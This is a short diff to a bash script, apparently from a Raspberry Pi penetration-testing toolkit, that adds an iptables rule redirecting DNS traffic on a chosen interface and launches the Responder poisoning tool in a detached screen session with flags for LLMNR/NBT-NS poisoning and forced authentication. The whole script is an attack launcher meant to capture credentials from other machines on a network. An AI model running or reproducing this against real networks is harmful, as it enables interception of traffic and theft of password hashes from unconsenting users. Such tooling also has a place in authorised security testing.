@@ -1,7 +1,11 @@
 #!/bin/bash
 
-echo '[*] running NetBIOS attacks'
+echo '[*] running Responder attacks'
 HOME='/home/pi/'
+
+[[ $(iptables -t nat -vnL PREROUTING | grep "$1" | grep 53) = '' ]] && {
+  iptables -t nat -A PREROUTING -i "$1" -p udp --dport 53 -j REDIRECT --to-port 53
+}
 
 [[ $(pgrep -f Responder.py) = '' ]] && {
 	screen -dmS responder python3 $HOME/src/responder/Responder.py -I "$1" -r -d -w -F
